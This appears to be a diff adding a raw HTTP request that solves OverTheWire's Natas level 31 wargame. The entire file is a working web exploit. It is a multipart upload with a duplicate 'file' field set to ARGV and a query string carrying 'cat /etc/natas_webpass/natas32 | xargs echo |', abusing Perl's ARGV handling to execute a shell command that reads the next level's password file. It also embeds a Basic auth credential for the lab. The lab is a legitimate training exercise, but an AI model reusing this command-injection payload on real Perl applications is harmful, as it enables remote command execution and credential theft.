@@ -1,0 +1,26 @@
+POST /index.pl?cat%20/etc/natas_webpass/natas32%20%7Cxargs%20echo%7C HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+User-Agent: python-requests/2.24.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Length: 391
+Content-Type: multipart/form-data; boundary=f48ddebe60ff46fae9df57674b73fcf0
+Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==
+
+--f48ddebe60ff46fae9df57674b73fcf0
+Content-Disposition: form-data; name="file"
+Content-Type: text/plain
+
+ARGV
+--f48ddebe60ff46fae9df57674b73fcf0
+Content-Disposition: form-data; name="file"; filename="abc.csv"
+Content-Type: text/csv
+
+Month,Year,Day
+
+--f48ddebe60ff46fae9df57674b73fcf0
+Content-Disposition: form-data; name="submit"
+
+Upload
+--f48ddebe60ff46fae9df57674b73fcf0--
